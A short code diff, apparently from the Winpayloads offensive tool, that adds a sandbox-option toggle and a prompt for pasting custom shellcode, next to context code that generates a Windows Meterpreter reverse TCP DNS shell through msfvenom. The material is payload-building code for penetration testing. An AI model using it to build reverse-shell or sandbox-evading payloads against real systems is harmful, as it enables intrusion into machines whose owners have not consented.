@@ -32,6 +32,14 @@ import netifaces
 
 t = blessed.Terminal()
 
+def sandboxChoose(choice):
+    from menu import sandboxMenuOptions, getAndRunSandboxMenu
+    if sandboxMenuOptions[choice]['availablemodules']:
+        sandboxMenuOptions[choice]['availablemodules'] = None
+    else:
+        sandboxMenuOptions[choice]['availablemodules'] = {str('ON'): ''}
+    return "clear"
+
 
 def payloaddir():
     return os.path.expanduser('~') + '/winpayloads'
@@ -128,6 +136,19 @@ class SHELLCODE(object):
     @staticmethod
     def windows_met_rev_shell_dns(ip, port):
         return msfvenomGeneration('windows/meterpreter/reverse_tcp_dns', ip, port)
+
+    @staticmethod
+    def windows_custom_shellcode():
+        customshell = ''
+        print 'Paste custom shellcode below\nType \'END\' when done.'
+        while True:
+            buildstr = raw_input().rstrip()
+            if buildstr == 'END':
+                break
+            else:
+                customshell += buildstr
+        return customshell
+
 
 
     windows_ps_rev_watch_screen = (
